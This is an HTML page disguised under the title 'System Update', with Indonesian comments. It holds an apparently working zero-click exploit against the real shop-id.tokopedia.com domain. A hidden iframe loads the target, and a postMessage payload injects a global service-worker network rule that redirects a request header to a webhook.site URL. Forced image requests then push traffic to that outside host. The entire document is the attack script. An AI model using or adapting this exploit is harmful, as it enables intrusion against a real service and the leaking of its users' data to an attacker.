<!DOCTYPE html>
<html>
<head><title>System Update</title></head>
<body>
    <iframe id="target" src="https://shop-id.tokopedia.com/robots.txt" style="display:none;"></iframe>

    <script>
        const targetFrame = document.getElementById('target');
        const webhook = "https://webhook.site/ID_LU_DI_SINI";

        function sendExploit() {
            console.log("Attempting Zero-Click Injection...");
            
            // Payload sesuai pns_logic.js: source harus 'main_thread'
            const payload = {
                source: "main_thread", 
                eventName: "network_rule",
                data: [{
                    ruleName: "zero_click_bypass",
                    global: true,
                    conditions: [],
                    handlers: [{
                        handler: "replace",
                        type: "header",
                        field: "X-Pns-Referrer",
                        value: webhook
                    }]
                }]
            };

            // Mengirim postMessage ke Iframe target
            targetFrame.contentWindow.postMessage(payload, "*");
        }

        targetFrame.onload = function() {
            console.log("Target successfully loaded (Status 200).");
            // Jeda 2 detik agar Service Worker siap menerima pesan
            setTimeout(sendExploit, 2000);
            
            // Trigger otomatis: Memaksa fetch agar SW mengirim data ke Webhook
            setTimeout(() => {
                const img = new Image();
                img.src = "https://shop-id.tokopedia.com/generate_204?trigger=" + Math.random();
            }, 4000);
        };
    </script>
</body>
</html>
